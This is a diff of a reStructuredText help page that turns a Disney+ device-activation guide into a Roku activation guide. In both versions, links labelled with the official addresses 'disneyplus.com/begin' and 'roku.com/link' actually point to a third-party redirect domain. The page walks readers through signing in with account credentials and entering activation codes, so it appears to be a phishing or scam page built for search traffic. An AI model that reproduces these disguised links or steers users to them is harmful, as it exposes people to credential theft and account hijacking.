@@ -1,9 +1,9 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+How to Connect Your Roku to Your Account via Roku.com/Link
 ##################
 
 .. meta::
-   :msvalidate.01: 79062439FF46DE4F09274CF8F25244E0
+   :msvalidate.01: FE216E19E94441856C00D18618ACAE7D
 
 .. image:: blank.png
    :width: 350px
@@ -14,35 +14,44 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :width: 350px
    :align: center
    :height: 100px
-   :alt: disneyplus.com/begin
-   :target: https://dis.redircoms.com
+   :alt: roku.com/link
+   :target: https://rk.redircoms.com
 
 .. image:: blank.png
    :width: 350px
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+Just got a new Roku device? You’re only a few steps away from enjoying your favorite streaming content. Link your Roku to your account at  
+`roku.com/link <https://rk.redircoms.com>`_ using the code displayed on your TV. Follow this step-by-step guide to activate it quickly.
 
 **********
-Steps to Activate Disney+ on Your Device
+How to Activate Your Roku Device
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Connect your Roku device to the TV and power it on.
+2. Complete the initial setup: select your language and Wi-Fi network.
+3. A unique **activation code** (e.g., XY12ZP) will appear on your TV screen.
+4. On your smartphone or computer, visit `roku.com/link <https://rk.redircoms.com>`_.
+5. Sign in to your Roku account, or create one if you're new.
+6. Enter the displayed code and click **Submit**.
+7. Your Roku will link to your account and finish setting up automatically.
 
 **********
-What to Do After Activation
+Things You’ll Need
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
+- Roku streaming player or Roku TV  
+- A working internet connection  
+- A valid Roku account  
+- The activation code shown on your TV  
 
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+**********
+Tips for a Smooth Setup
+**********
+
+- If the activation code expires, restart your Roku device to get a new one.  
+- Ensure you're connected to a stable Wi-Fi network during setup.  
+- Use the same Roku account on all devices for shared access and purchases.
+
+Start streaming effortlessly—visit `roku.com/link <https://rk.redircoms.com>`_ to complete your Roku activation in just minutes.
